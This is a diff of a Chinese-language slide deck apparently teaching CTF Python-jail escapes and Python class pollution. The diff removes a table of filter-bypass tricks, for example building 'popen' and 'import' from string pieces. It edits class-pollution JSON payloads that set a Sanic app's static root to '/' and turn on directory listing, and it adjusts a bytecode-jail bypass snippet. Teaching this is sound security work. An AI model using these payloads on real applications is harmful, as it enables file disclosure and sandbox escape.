@@ -230,42 +230,6 @@ graph LR
 layout: two-cols-header
 ---
 
-## 绕过备忘录
-
-::left::
-
-### 常见过滤器绕过方案
-
-| 被拦截 | 解决方案 |
-| --- | --- |
-| `__` | `"_" + "_"` / `"_" ~ "_"` / `request.args` |
-| `.` | `\|attr("x")` / `["key"]` |
-| `[]` | `\|attr("__getitem__")(key)` |
-| `'` / `"` | `request.args` / `request.cookies` |
-| `_` | `"\x5f"` (hex) / `chr(95)` |
-| `\|` | bracket notation `["key"]` (no filters) |
-| `attr` | `["key"]` / `__getattribute__()` |
-| `import` | `"_" ~ "_imp" ~ "ort_" ~ "_"` |
-| `os` | `"o" ~ "s"` / subclass gadget |
-| `popen` | `"po" ~ "pen"` / `"p\x6fpen"` |
-
-::right::
-
-### 常用字符 Hex 编码
-
-| Symbol | Hex Escape |
-| --- | --- |
-| `_` | `\x5f` |
-| `.` | `\x2e` |
-| `[` | `\x5b` |
-| `]` | `\x5d` |
-| `'` | `\x27` |
-| `"` | `\x22` |
-
----
-layout: two-cols-header
----
-
 ## 定位并访问 `__builtins__`
 
 ::left::
@@ -1167,13 +1131,13 @@ async def admin(request):
   <div class="flex gap-2 items-start text-sm">
     <div class="text-red-500 font-bold text-lg">1.</div>
     <div class="text-gray-600 dark:text-gray-400">
-      <span class="font-bold">漏洞核心</span>。使用用户可控的 <code>key</code> 和 <code>value</code> 对 <code>Pollute</code> 实例进行深度属性设置。这是原型链污染的入口 (Sink)。
+      <span class="font-bold">漏洞核心</span>。使用用户可控的 <code>key</code> 和 <code>value</code> 对 <code>Pollute</code> 实例进行深度属性设置。这是原型链污染的入口。
     </div>
   </div>
   <div class="flex gap-2 items-start text-sm">
     <div class="text-red-500 font-bold text-lg">2.</div>
     <div class="text-gray-600 dark:text-gray-400">
-      <span class="font-bold">一个简陋的 WAF</span>。它试图通过过滤 <code>_</code> 和 <code>.</code> 的组合来阻止常见的原型链污染 payload (如 <code>__class__</code>)。
+      <span class="font-bold">一个简陋的 WAF</span>。它试图通过过滤 <code>_</code> 和 <code>.</code> 的组合来阻止常见的原型链污染 payload (如 <code>__class__</code> 等)。
     </div>
   </div>
 </div>
@@ -1272,7 +1236,7 @@ layout: default
 
 ## 理解 Python 中的「类污染」
 
-虽然 Python 没有 JavaScript 的原型链，但其动态特性允许实现一种效果类似的攻击，我们称之为「类污染」 _(Class Pollution)_。
+虽然 Python 没有 JavaScript 的原型链，但其动态特性允许实现一种效果类似的攻击，我们称之为「类污染」 _(Class Pollution)_。Ref: [1](https://tttang.com/archive/1876/) [2](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
 
 <div class="grid grid-cols-2 gap-4 text-sm">
   <!-- JS Prototype Pollution -->
@@ -1357,7 +1321,7 @@ layout: default
     </div>
     <div class="flex items-center gap-2">
       <div class="i-carbon-idea text-yellow-500"></div>
-      <span class="font-bold">目标:</span> 构造一个不含 `_.` 字符串的 key，但其解析后的路径又能包含 `__...__` 这样的魔术属性。
+      <span class="font-bold">目标:</span> 构造一个不含 <code>_.</code> 字符串的 key，但其解析后的路径又能包含 <code>__...__</code> 这样的魔术属性。
     </div>
   </div>
 </div>
@@ -1425,7 +1389,7 @@ layout: default
 - Payload 1: 开启目录浏览
 
 ```json
-{"key":"__init__\\.__globals__\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view", "value": true}
+{"key":"__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view", "value": true}
 ```
 
 <div class="scale-90 origin-left">
@@ -1455,13 +1419,13 @@ graph LR
 - Payload 2: 改变静态文件根目录
 
 ```json
-{"key":"__init__\\.__globals__\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory", "value": "/"}
+{"key":"__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory", "value": "/"}
 ```
 
 - Payload 3 (备用/补充)：直接修改目录 `Path` 对象
 
 ```json
-{"key":"__init__\\.__globals__\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts", "value": ["/"]}
+{"key":"__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts", "value": ["/"]}
 ```
 
 </div>
@@ -2136,7 +2100,7 @@ for c in consts:
 ```python
 try:
     # 1) Break opcode checker: LOAD_METHOD + "randint" on one line.
-    random.randint(0, 100)
+    random.randint()
 except:
     print("bytecode jail bypassed!")
 g = None
@@ -2158,3 +2122,10 @@ try:
 except:
     pass
 ```
+
+---
+
+## Python Jail 学习资料
+
+- [PyJails in the Wild Bringing CTF Challenges to the Real World](https://docs.google.com/presentation/d/1WXK1CbY4krkzmQFu_xxQ2PqgSyFSC7vWvh6PEY0tEyk/)
+- [Bypass Python sandboxes - HackTricks](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html)
